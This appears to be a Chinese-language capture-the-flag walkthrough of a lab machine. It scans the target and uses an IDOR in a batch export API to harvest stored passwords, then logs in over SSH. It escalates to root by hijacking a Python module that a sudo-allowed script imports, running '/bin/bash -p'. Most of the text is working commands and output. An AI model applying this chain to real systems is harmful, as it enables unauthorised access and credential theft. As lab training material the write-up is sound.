## 信息收集

### 扫存活主机并定位目标

```bash
sudo arp-scan -l
```

```text
192.168.205.139 08:00:27:f5:68:b0       PCS Systemtechnik GmbH
```

我这里先用 `arp-scan` 把网段活主机捞出来，`192.168.205.139` 看起来就是靶机。

### 全端口扫描

```bash
nmap -p 0-65535 192.168.205.139
```

```text
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
```

全端口扫出来只有 22、80、3000，说明攻击面很收敛，重点就放在 Web 和 SSH 凭据获取上。

## Web 入口摸索

### 看 80 和 3000 的响应

```bash
curl 192.168.205.139
```

```text
index
```

80 端口只回了个 `index`，没什么直接价值。

```bash
curl 192.168.205.139:3000
```

```html
<title>Redirecting...</title>
...
<a href="/fill">/fill</a>
```

3000 会跳到 `/fill`，明显是主业务入口。

```bash
curl 192.168.205.139:3000/fill
```

```html
<form method="POST" action="/fill">
  ...
  <input type="text" name="userid" required placeholder="输入你的ID">
  <input type="password" name="password" required placeholder="输入密码用于团队内部系统分配">
</form>
```

页面是个“团队成员信息调查”表单，字段就俩：`userid` 和 `password`。这种地方我会顺手测一把模板注入。

### SSTI 试探（失败）

```bash
curl -i -c c.txt -b c.txt -X POST 'http://192.168.205.139:3000/fill' \
  --data-urlencode "userid={{7*7}}" \
  --data-urlencode "password=test"
```

```text
HTTP/1.0 302 FOUND
Location: http://192.168.205.139:3000/view?id=10
Set-Cookie: session=...
```

我把 `{{7*7}}` 塞进 `userid`，服务端给了会话并跳转到 `/view?id=10`。后面看到页面把它按字面量显示并做了 HTML 转义，这个点的 SSTI 基本能排除。

## /api/export 越权拿凭据

### 枚举接口路径

```bash
dirsearch -q -u 192.168.205.139:3000/api
```

```text
[23:30:15] 400 -   33B  - http://192.168.205.139:3000/api/export
```

`/api/export` 直接浮出来了，返回 400 通常意味着“接口存在但参数不对”。

### 验证参数逻辑和授权边界

```bash
curl 'http://192.168.205.139:3000/api/export'
```

```json
{"error":"Missing id parameter"}
```

没带 `id` 会报缺参，接口逻辑清楚了。

```bash
curl 'http://192.168.205.139:3000/api/export?id=1'
```

```json
{"error":"未授权访问！仅限系统内部成员调用此 API。"}
```

匿名状态访问会被拒绝，说明要带前面问卷流程下发的 session和cookie。

```bash
curl -i -b c.txt 'http://192.168.205.139:3000/api/export?id=10'
```

```json
{
  "_meta":{
    "hint":"提示：此接口支持批量查询，可提高效率（格式：id=1,2,3）",
    "query_type":"single"
  },
  "data":[{"member_user_id":"{{7*7}}","survey_id":10,"system_password":"test"}],
  "status":"success"
}
```

带上 cookie 后能正常查到我自己的记录。关键是它主动给了提示：支持 `id=1,2,3` 批量查询。

### 利用批量查询做越权

```bash
curl -i -b c.txt 'http://192.168.205.139:3000/api/export?id=10,1'
```

```json
{
  "_meta":{"query_type":"batch"},
  "data":[
    {"member_user_id":"{{7*7}}","survey_id":10,"system_password":"test"},
    {"member_user_id":"fake_member_1","survey_id":1,"system_password":"P@ss_fake_1!!"}
  ],
  "status":"success"
}
```

这一步就坐实了：只要混进“我自己的 id=10”，就能把别人的记录一并带出来，典型越权。

```bash
for i in $(seq 1 10); do
  curl -s -b c.txt "http://192.168.205.139:3000/api/export?id=10,$i" \
  | jq -r '.data[]? | "\(.survey_id)\t\(.member_user_id)\t\(.system_password)"'
done
```

```text
...
6       x3x     p@ssw0rd_x3x
...
```

批量跑一遍后，真正可用的不是那些 fake 账号，而是 `x3x / p@ssw0rd_x3x` 这组看起来像系统真实用户凭据。

## SSH 落地与本地提权

### 用泄露凭据登录 SSH

```bash
ssh x3x@192.168.205.139
```

```text
x3x@Survey:~$ id
uid=1001(x3x) gid=1001(x3x) groups=1001(x3x)
```

凭据可用，直接进了机器，拿到普通用户 `x3x`。

### 查 sudo 权限

```bash
sudo -l
```

```text
User x3x may run the following commands on Survey:
    (root) NOPASSWD: /usr/bin/python3 /opt/maze_admin/generate_report.py
```

这里是无密码 sudo 跑一个固定 Python 脚本，提权窗口已经打开了。

### 分析脚本与可写模块路径

```bash
ls -al /opt/maze_admin/generate_report.py
cat /opt/maze_admin/generate_report.py
```

```python
import os
import sys
import time
sys.path.insert(0, "/opt/maze_admin/libs")

import report_formatter

print("[*] 正在启动 Maze 团队日志分析模块...")
time.sleep(1)
report_formatter.print_header()

print("[*] 分析完成，未发现异常日志。")
```

脚本把 `/opt/maze_admin/libs` 插到了 `sys.path` 前面，再导入 `report_formatter`，这就要看这个目录和模块文件权限。

```bash
ls -la /opt/maze_admin/libs
```

```text
drwxrwxr-x 2 root x3x  4096 Feb 23 07:23 .
-rw-r--r-- 1 root root  161 Feb 23 07:23 report_formatter.py
```

目录对组 `x3x` 可写，虽然原文件不可写，但我可以通过目录写权限重命名旧文件并放一个同名恶意模块。

### 替换 report_formatter.py 并触发 root shell

恶意模块内容：

```python
import os
def print_header():
    os.system("/bin/bash -p")
```

执行替换并触发：

```bash
cd /opt/maze_admin/libs
mv report_formatter.py 1.py
vim report_formatter.py
sudo /usr/bin/python3 /opt/maze_admin/generate_report.py
```

```text
[*] 正在启动 Maze 团队日志分析模块...
root@Survey:/opt/maze_admin/libs# id
uid=0(root) gid=0(root) groups=0(root)
```

`generate_report.py` 以 root 身份导入了我伪造的 `report_formatter`，`/bin/bash -p` 直接把 root shell 弹出来了。

## 权限验证与取证据

```bash
cat /root/root.txt /home/x3x/user.txt
```

```text
flag{root-866fa8a4-b5bc-4907-b549-b89a024f5f47}
flag{user-cafa5f8b-6a6f-4ae5-9fe7-6a734e378acd}
```

两个 flag 都拿到并验证完成。